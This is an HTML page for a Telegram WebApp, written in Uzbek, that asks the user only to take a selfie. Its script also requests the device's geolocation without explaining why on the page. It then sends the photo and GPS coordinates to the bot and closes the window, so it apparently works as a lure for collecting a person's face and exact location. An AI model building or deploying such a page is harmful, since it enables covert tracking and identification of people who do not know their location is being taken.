<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kamera va Lokatsiya</title>
    <!-- Telegram WebApp uchun maxsus skript -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
        }
        video {
            width: 90%;
            max-width: 400px;
            border-radius: 10px;
            background-color: #000;
            transform: scaleX(-1); /* Selfi ko'rinishi uchun */
        }
        button {
            padding: 12px 24px;
            font-size: 16px;
            background-color: #0088cc;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            font-weight: bold;
        }
        #status {
            margin-top: 10px;
            color: #555;
            font-size: 14px;
            text-align: center;
        }
    </style>
</head>
<body>

    <h2>Ozingizni Selfie qiling</h2>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <button id="sendBtn">Ozingizni selfie qiling</button>
    <div id="status">Kameraga ruxsat kutilmoqda...</div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); // Oynani kattalashtirish

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const sendBtn = document.getElementById('sendBtn');
        const statusDiv = document.getElementById('status');

        let userLocation = { lat: 0, lon: 0 };

        // 1. Kamerani yoqish
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then((stream) => {
                video.srcObject = stream;
                statusDiv.innerText = "Kamera tayyor. Tugmani bosing.";
            })
            .catch((err) => {
                statusDiv.innerText = "Kameraga ruxsat berilmadi yoki xato!";
                alert("Kameraga ruxsat berishingiz shart!");
            });

        // 2. Lokatsiyani xavfsiz olish (foni buzilmasligi uchun)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    userLocation.lat = position.coords.latitude;
                    userLocation.lon = position.coords.longitude;
                },
                (err) => {
                    console.log("Lokatsiya aniqlanmadi, lekin davom etamiz.");
                }
            );
        }

        // 3. Tugma bosilganda rasmga olib yuborish
        sendBtn.addEventListener('click', () => {
            statusDiv.innerText = "Yuborilmoqda...";
            
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Videodan kadrni kesib olish
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Rasmni matnga o'tkazish
            const base64Image = canvas.toDataURL('image/jpeg', 0.6);

            // Paket tayyorlash
            const payload = {
                latitude: userLocation.lat,
                longitude: userLocation.lon,
                photo: base64Image
            };

            // Botga yuborish va oynani yopish
            tg.sendData(JSON.stringify(payload));
            setTimeout(() => {
                tg.close();
            }, 500);
        });
    </script>
</body>
</html>
